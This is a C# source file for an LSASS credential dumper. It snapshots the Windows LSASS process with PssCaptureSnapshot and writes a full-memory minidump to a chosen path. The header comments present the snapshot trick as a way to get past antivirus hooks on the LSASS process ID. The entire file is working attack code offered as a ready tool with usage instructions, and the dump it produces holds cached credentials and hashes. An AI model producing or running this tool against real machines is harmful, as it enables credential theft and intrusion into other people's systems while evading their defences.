// PssCaptureSnapshot LSASS dumper.
// Dumps LSASS via a process snapshot — MiniDumpWriteDump targets the snapshot
// handle, not lsass.exe directly, bypassing AV signatures that hook on lsass PID.
// Requires PROCESS_ALL_ACCESS on lsass (admin) but NOT PPL-safe.
// Usage: pss-dumper.exe <output_path>
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using DWORD  = System.Int32;
using BOOL   = System.Int32;
using HANDLE = System.IntPtr;
using HPSS   = System.IntPtr;
using PVOID  = System.IntPtr;

namespace PssDumper
{
    [Flags]
    enum PSS_CAPTURE_FLAGS : uint
    {
        PSS_CAPTURE_NONE                          = 0x00000000,
        PSS_CAPTURE_VA_CLONE                      = 0x00000001,
        PSS_CAPTURE_HANDLES                       = 0x00000004,
        PSS_CAPTURE_HANDLE_NAME_INFORMATION       = 0x00000008,
        PSS_CAPTURE_HANDLE_BASIC_INFORMATION      = 0x00000010,
        PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFO     = 0x00000020,
        PSS_CAPTURE_HANDLE_TRACE                  = 0x00000040,
        PSS_CAPTURE_THREADS                       = 0x00000080,
        PSS_CAPTURE_THREAD_CONTEXT                = 0x00000100,
        PSS_CREATE_MEASURE_PERFORMANCE            = 0x40000000,
    }

    [Flags]
    enum MINIDUMP_TYPE : int
    {
        MiniDumpNormal                            = 0x00000000,
        MiniDumpWithDataSegs                      = 0x00000001,
        MiniDumpWithFullMemory                    = 0x00000002,
        MiniDumpWithHandleData                    = 0x00000004,
        MiniDumpWithUnloadedModules               = 0x00000020,
        MiniDumpWithProcessThreadData             = 0x00000100,
        MiniDumpWithPrivateReadWriteMemory        = 0x00000200,
        MiniDumpWithFullMemoryInfo                = 0x00000800,
        MiniDumpWithThreadInfo                    = 0x00001000,
        MiniDumpWithPrivateWriteCopyMemory        = 0x00010000,
        MiniDumpWithTokenInformation              = 0x00040000,
        MiniDumpWithModuleHeaders                 = 0x00080000,
    }

    enum MINIDUMP_CALLBACK_TYPE : uint
    {
        IsProcessSnapshotCallback = 16,
    }

    struct MINIDUMP_CALLBACK_OUTPUT { public int Status; }

    struct MINIDUMP_CALLBACK_INFORMATION
    {
        public IntPtr CallbackRoutine;
        public PVOID  CallbackParam;
    }

    class Program
    {
        [DllImport("kernel32")] static extern HANDLE OpenProcess(uint dwAccess, BOOL bInherit, DWORD dwPid);
        [DllImport("kernel32")] static extern BOOL   CloseHandle(HANDLE h);
        [DllImport("kernel32")] static extern DWORD  PssCaptureSnapshot(HANDLE hProcess, PSS_CAPTURE_FLAGS flags, DWORD threadCtxFlags, out HPSS snapshotHandle);
        [DllImport("kernel32")] static extern DWORD  PssFreeSnapshot(HANDLE hProcess, HPSS snapshotHandle);
        [DllImport("dbghelp",  SetLastError = true)]
        static extern BOOL MiniDumpWriteDump(HANDLE hProcess, DWORD pid, HANDLE hFile,
            MINIDUMP_TYPE dumpType, IntPtr exInfo, IntPtr userStream, IntPtr cbParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate BOOL MiniDumpCallbackDelegate(PVOID param, IntPtr input, IntPtr output);

        // Callback that tells MiniDumpWriteDump the target is a snapshot, not a live process.
        static unsafe BOOL Callback(PVOID param, IntPtr input, IntPtr output)
        {
            // input layout: int CallbackType at offset sizeof(int) + IntPtr.Size
            byte cbType = Marshal.ReadByte(input + sizeof(int) + IntPtr.Size);
            if (cbType == (int)MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback)
            {
                var p = (MINIDUMP_CALLBACK_OUTPUT*)output;
                p->Status = 1; // S_FALSE — signals snapshot mode
            }
            return 1;
        }

        static int Main(string[] args)
        {
            if (args.Length < 1) { Console.Error.WriteLine("usage: pss-dumper.exe <out.dmp>"); return 1; }
            string outPath = args[0];

            Process[] procs = Process.GetProcessesByName("lsass");
            if (procs.Length == 0) { Console.Error.WriteLine("lsass not found"); return 1; }
            int pid = procs[0].Id;

            // PROCESS_ALL_ACCESS = 0x1F0FFF
            HANDLE hProc = OpenProcess(0x1F0FFF, 0, pid);
            if (hProc == IntPtr.Zero)
            {
                Console.Error.WriteLine("OpenProcess failed: " + Marshal.GetLastWin32Error());
                return 1;
            }

            var flags = PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
                      | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
                      | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
                      | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
                      | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFO
                      | PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
                      | PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
                      | PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
                      | PSS_CAPTURE_FLAGS.PSS_CREATE_MEASURE_PERFORMANCE;

            HPSS snapshot;
            DWORD rc = PssCaptureSnapshot(hProc, flags,
                IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out snapshot);
            if (rc != 0)
            {
                Console.Error.WriteLine("PssCaptureSnapshot failed: " + rc);
                CloseHandle(hProc);
                return 1;
            }

            int ret = 0;
            try
            {
                using (var fs = new FileStream(outPath, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
                {
                    var cbDelegate = new MiniDumpCallbackDelegate(Callback);
                    var cbInfo     = new MINIDUMP_CALLBACK_INFORMATION
                    {
                        CallbackRoutine = Marshal.GetFunctionPointerForDelegate(cbDelegate),
                        CallbackParam   = IntPtr.Zero,
                    };
                    IntPtr cbPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cbInfo));
                    Marshal.StructureToPtr(cbInfo, cbPtr, false);

                    var dumpType = MINIDUMP_TYPE.MiniDumpWithDataSegs
                                 | MINIDUMP_TYPE.MiniDumpWithTokenInformation
                                 | MINIDUMP_TYPE.MiniDumpWithPrivateWriteCopyMemory
                                 | MINIDUMP_TYPE.MiniDumpWithPrivateReadWriteMemory
                                 | MINIDUMP_TYPE.MiniDumpWithUnloadedModules
                                 | MINIDUMP_TYPE.MiniDumpWithFullMemory
                                 | MINIDUMP_TYPE.MiniDumpWithHandleData
                                 | MINIDUMP_TYPE.MiniDumpWithThreadInfo
                                 | MINIDUMP_TYPE.MiniDumpWithFullMemoryInfo
                                 | MINIDUMP_TYPE.MiniDumpWithProcessThreadData
                                 | MINIDUMP_TYPE.MiniDumpWithModuleHeaders;

                    BOOL ok = MiniDumpWriteDump(snapshot, (DWORD)pid,
                        fs.SafeFileHandle.DangerousGetHandle(), dumpType,
                        IntPtr.Zero, IntPtr.Zero, cbPtr);

                    Marshal.FreeHGlobal(cbPtr);
                    GC.KeepAlive(cbDelegate);

                    if (ok == 0)
                    {
                        Console.Error.WriteLine("MiniDumpWriteDump failed: 0x" + Marshal.GetHRForLastWin32Error().ToString("X"));
                        ret = 1;
                    }
                    else
                    {
                        Console.WriteLine("OK: " + outPath);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("Exception: " + ex.Message);
                ret = 1;
            }
            finally
            {
                PssFreeSnapshot(hProc, snapshot);
                CloseHandle(hProc);
            }
            return ret;
        }
    }
}
